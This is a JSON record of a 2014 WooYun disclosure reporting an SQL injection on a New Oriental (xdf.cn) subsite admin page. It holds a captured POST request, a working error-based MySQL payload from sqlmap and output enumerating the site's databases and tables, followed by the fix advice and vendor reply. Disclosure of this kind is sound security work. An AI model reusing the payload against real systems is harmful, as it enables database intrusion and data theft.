{"id": 59174, "wybug_id": "wooyun-2014-048349", "wybug_title": "新东方某分站存在SQL注入漏洞导致信息泄露（多库）", "wybug_corp": "新东方", "wybug_author": "Mr.leo", "wybug_date": "2014-01-10 18:22", "wybug_open_date": "2014-02-24 18:22", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["管理后台对外", "字符类型注射", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-01-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-02-24：\t细节向公众公开  简要描述： 新东方某分站存在SQL注入漏洞导致信息泄露（多库） 详细说明：  站点：http://20zn.sz.xdf.cn/admin/admin_login.php utel参数没有过滤，导致注射burp抓包数据POST /admin/admin_registerList.php HTTP/1.1Content-Length: 229Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://20zn.sz.xdf.cn/admin/admin_login.phpCookie: PHPSESSID=oh6apane20en4s01h6odj2ai81Host: 20zn.sz.xdf.cnConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*ac=add&classCode%5b%5d=94102&classCode_id%5b%5d=0&money=1&regionID=0&uid=0&uname=vubetqan&utel=555-666-0606sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: utel    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: ac=add&classCode[]=94102&classCode_id[]=0&money=1&regionID=0&uid=0&uname=vubetqan&utel=555-666-0606 AND (SELECT 4881 FROM(SELECT COUNT(*),CONCAT(0x3a66646d3a,(SELECT (CASE WHEN (4881=4881) THEN 1 ELSE 0 END)),0x3a7471783a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)---[09:12:14] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.3.5back-end DBMS: MySQL 5.0[09:12:14] [INFO] fetching current user[09:12:14] [INFO] resumed: choujiang@172.17.64.0/255.255.255.0current user:    'choujiang@172.17.64.0/255.255.255.0'[09:12:14] [INFO] fetching current database[09:12:14] [INFO] resumed: cj_szcurrent database:    'cj_sz'[09:12:14] [INFO] fetching database names[09:12:14] [INFO] the SQL query used returns 4 entries[09:12:14] [INFO] resumed: information_schema[09:12:14] [INFO] resumed: cj_cd[09:12:14] [INFO] resumed: cj_sz[09:12:14] [INFO] resumed: cj_zzavailable databases [4]:[*] cj_cd[*] cj_sz[*] cj_zz[*] information_schemaDatabase: cj_sz[7 tables]+----------------+| admin          || message_log    || prize          || prize_type     || register       || register_class || school_region  |+----------------+Database: cj_sz+----------------+---------+| Table          | Entries |+----------------+---------+| register_class | 7163    || message_log    | 5187    || register       | 3168    || prize          | 1335    || admin          | 25      || school_region  | 18      || prize_type     | 5       |+----------------+---------+\n\n另外一个库\n\nover   漏洞证明：  已经证明   修复方案：  1#修复注射漏洞2#登录界面增加验证码   版权声明：转载请注明来源 Mr.leo@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2014-01-13 13:57 厂商回复： 谢谢提供消息，我们会尽快确认并修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}